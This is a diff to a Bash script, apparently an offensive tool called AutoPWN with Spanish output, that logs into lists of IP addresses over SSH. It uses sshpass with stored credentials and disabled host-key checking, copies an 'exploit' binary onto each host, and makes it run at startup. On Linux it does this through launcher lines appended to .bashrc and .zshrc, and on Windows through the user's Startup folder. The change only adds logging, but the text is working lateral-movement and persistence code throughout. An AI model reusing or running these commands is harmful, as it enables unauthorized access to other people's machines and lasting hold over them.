@@ -234,12 +234,13 @@ ip=$(sed "${i}q;d" "AutoPWN/ips.txt")
         if [ "$startup" = "si" ]; then
             echo -e "\e[9;38m[\e[9;32m+\e[9;38m] INTENTANDO AÑADIR EL EXPLOIT AL INICIO EN EL PC \e[9;32m$ip\e[9;38m\n\n"
             if echo "$OS" | grep -q "LINUX"; then
-                timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cp -f \"$linworkdir/$linuxoutname\" ~/$linuxoutname & grep -q "\$linuxoutname" "~/.bashrc" || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.bashrc || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.zshrc" >/dev/null 2>&1
+                output3=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cp -f \"$linworkdir/$linuxoutname\" ~/$linuxoutname & grep -q "\$linuxoutname" "~/.bashrc" || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.bashrc && grep -q "\$linuxoutname" "~/.zshrc" || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.zshrc" 2>&1)
             else
-                timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "copy \"$winworkdir\\$windowsoutname\" \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\$windowsoutname\" /y" >/dev/null 2>&1
+                output3=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "copy \"$winworkdir\\$windowsoutname\" \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\$windowsoutname\" /y" 2>&1)
             fi
+    	    echo "$output3" >> AutoPWN/SSHlog.txt
         fi
-            
+
         if [ "$autoroot" = "si" ]; then
             if echo "$OS" | grep -q "LINUX"; then
                 echo -e "\e[9;38m[\e[9;32m+\e[9;38m] COMPROBANDO SI \e[9;32m$ip\e[9;38m TIENE ROOT\n\n"
@@ -252,6 +253,7 @@ ip=$(sed "${i}q;d" "AutoPWN/ips.txt")
                     echo -e "\e[9;38m[\e[9;31m-\e[9;38m] EL PC \e[9;31m$ip\e[9;38m NO TIENE ROOT\n\n"
                 fi
             fi
+    	    echo "$output2" >> AutoPWN/SSHlog.txt
         fi
             
         if [ "$sshstarttoo" = "si" ]; then
